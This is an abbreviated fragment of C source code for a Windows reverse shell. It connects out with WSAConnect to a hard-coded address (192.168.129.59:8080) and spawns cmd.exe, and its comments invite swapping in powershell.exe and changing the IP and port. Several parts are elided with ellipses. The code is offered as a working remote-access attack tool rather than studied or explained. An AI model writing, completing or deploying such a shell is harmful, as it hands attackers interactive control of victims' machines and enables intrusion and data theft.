    ...
    while (true) {
        ...
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            ...
            if (RecvCode <= 0) {
                ...
                char Process[] = "cmd.exe"; //Change it to powershell.exe for starting a powershell process.
                STARTUPINFO sinfo;
...
int main(int argc, char** argv) {
    ...
    if (argc == 3) {
        ...
        char host[] = "192.168.129.59"; //Change the IP address [IPV4]
        int port = 8080; //Change the port 
        RunShell(host, port);
    }
    return 0;
}
